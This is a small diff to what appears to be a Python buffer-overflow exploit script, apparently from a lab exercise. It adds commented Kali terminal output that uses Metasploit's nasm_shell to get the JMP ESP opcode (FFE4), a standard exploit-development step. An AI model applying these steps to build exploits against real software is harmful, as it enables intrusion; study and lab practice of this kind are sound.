@@ -12,3 +12,14 @@ try:
 except: 
         print "Error connecting to server"
         sys.exit()
+
+
+
+#kali@kali:~/Desktop/BufferOverflow$ locate nasm_shell
+#/usr/bin/msf-nasm_shell
+#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+#kali@kali:~/Desktop/BufferOverflow$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+#nasm > JMP ESP
+#00000000  FFE4              jmp esp
+#nasm > exit
+
